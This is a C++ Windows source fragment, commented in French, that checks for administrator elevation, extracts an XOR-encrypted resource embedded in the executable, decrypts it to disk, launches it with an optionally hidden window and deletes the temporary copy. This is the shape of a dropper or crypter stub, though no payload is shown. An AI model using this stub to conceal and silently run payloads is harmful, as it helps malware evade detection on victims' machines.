void LancerExe(string commande, bool cacher);

bool VerifAdmin() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

string ExtraireRes(WORD NomRes, string Destination) {
	// Lecture de la ressource
	HRSRC Ressource = ::FindResource(NULL, MAKEINTRESOURCE(NomRes), RT_RCDATA);
	unsigned int tailleRes = ::SizeofResource(NULL, Ressource);
	HGLOBAL DonneesRes = ::LoadResource(NULL, Ressource);
	void* Executable = ::LockResource(DonneesRes);

	// Ecriture du fichier temporaire
	string chemCrypt = TEMP + RandomStr(6);
	std::ofstream f(chemCrypt, std::ios::out | std::ios::binary);
	f.write((char*)Executable, tailleRes);
	f.close();

	// Decryptage vers chemin original
	fXOR(chemCrypt, Destination);

	// Retour du fichier crypt� temporaire
	return chemCrypt;
}

void LancerRes(WORD NomRes, string Destination, string arguments = "", bool cacher = false) {
	// Extraction & decryptage de la ressource
	string chemCrypt = ExtraireRes(NomRes, Destination);

    // Lancement & fin
    LancerExe(Destination + " " + arguments, cacher);

    // Nettoyage
    DeleteFile(chemCrypt.c_str());
}

void LancerExe(string commande, bool cacher) {
    // Infos de d�marrage du processus
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    DWORD DrapeauxProc = CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS;
    if (cacher) {
        DrapeauxProc = CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW | DETACHED_PROCESS;
        si.wShowWindow = SW_HIDE;
    }
    // Infos sur le processus
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    CreateProcess(
        NULL,			// Pas de nom de module (utiliser ligne de commande)
        (char*)commande.c_str(),		// Ligne de commande
        NULL,           // Instance du processus non h�ritable
        NULL,           // Instance de la tache non-h�ritable
        FALSE,          // Pas d'h�ritage de l'instance
        DrapeauxProc,   // Drapeaux de cr�ation
        NULL,           // Utiliser le bloc d'environnement du parent
        NULL,           // Utiliser le dossier de d�marrage du parent
        &si,            // Pointer to STARTUPINFO structure
        &pi);           // Pointer to PROCESS_INFORMATION structure
}
